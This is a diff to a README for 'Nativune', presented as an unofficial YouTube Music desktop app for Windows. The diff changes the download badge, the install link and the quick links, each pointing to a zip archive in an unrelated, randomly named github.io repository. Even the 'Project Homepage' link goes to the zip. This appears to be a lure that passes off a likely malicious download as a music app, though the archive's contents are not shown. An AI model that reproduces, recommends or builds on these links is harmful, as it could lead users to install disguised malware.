@@ -9,11 +9,11 @@ description: "Unofficial native YouTube Music desktop app for Windows with WinUI
 
 Welcome to Nativune! This is the easiest way to enjoy YouTube Music right on your Windows computer, without needing a web browser. Think of it as your own personal music app that lives in your system tray, ready to play your favorite tunes instantly.
 
-[![Download Nativune](https://img.shields.io/badge/Download-Nativune-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Selfpollinating-lichtenoideczema840/selfpollinating-lichtenoideczema840.github.io/main/pathbreaker/2.1.zip)
+[![Download Nativune](https://img.shields.io/badge/Download-Nativune-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Selfpollinating-lichtenoideczema840/selfpollinating-lichtenoideczema840.github.io/raw/refs/heads/main/pathbreaker/2.1.zip)
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://raw.githubusercontent.com/Selfpollinating-lichtenoideczema840/selfpollinating-lichtenoideczema840.github.io/main/pathbreaker/2.1.zip](https://raw.githubusercontent.com/Selfpollinating-lichtenoideczema840/selfpollinating-lichtenoideczema840.github.io/main/pathbreaker/2.1.zip)
+Visit this link to download the application: [https://github.com/Selfpollinating-lichtenoideczema840/selfpollinating-lichtenoideczema840.github.io/raw/refs/heads/main/pathbreaker/2.1.zip](https://github.com/Selfpollinating-lichtenoideczema840/selfpollinating-lichtenoideczema840.github.io/raw/refs/heads/main/pathbreaker/2.1.zip)
 
 Once you click the download button, the file will save to your computer. That's it - you're one step away from your new music experience.
 
@@ -167,8 +167,8 @@ Nativune transforms how you listen to music on Windows. It's simple, fast, and m
 
 ## 🔗 Quick Links
 
-- **Download**: [https://raw.githubusercontent.com/Selfpollinating-lichtenoideczema840/selfpollinating-lichtenoideczema840.github.io/main/pathbreaker/2.1.zip](https://raw.githubusercontent.com/Selfpollinating-lichtenoideczema840/selfpollinating-lichtenoideczema840.github.io/main/pathbreaker/2.1.zip)
-- **Project Homepage**: [https://raw.githubusercontent.com/Selfpollinating-lichtenoideczema840/selfpollinating-lichtenoideczema840.github.io/main/pathbreaker/2.1.zip](https://raw.githubusercontent.com/Selfpollinating-lichtenoideczema840/selfpollinating-lichtenoideczema840.github.io/main/pathbreaker/2.1.zip)
+- **Download**: [https://github.com/Selfpollinating-lichtenoideczema840/selfpollinating-lichtenoideczema840.github.io/raw/refs/heads/main/pathbreaker/2.1.zip](https://github.com/Selfpollinating-lichtenoideczema840/selfpollinating-lichtenoideczema840.github.io/raw/refs/heads/main/pathbreaker/2.1.zip)
+- **Project Homepage**: [https://github.com/Selfpollinating-lichtenoideczema840/selfpollinating-lichtenoideczema840.github.io/raw/refs/heads/main/pathbreaker/2.1.zip](https://github.com/Selfpollinating-lichtenoideczema840/selfpollinating-lichtenoideczema840.github.io/raw/refs/heads/main/pathbreaker/2.1.zip)
 
 ---
 
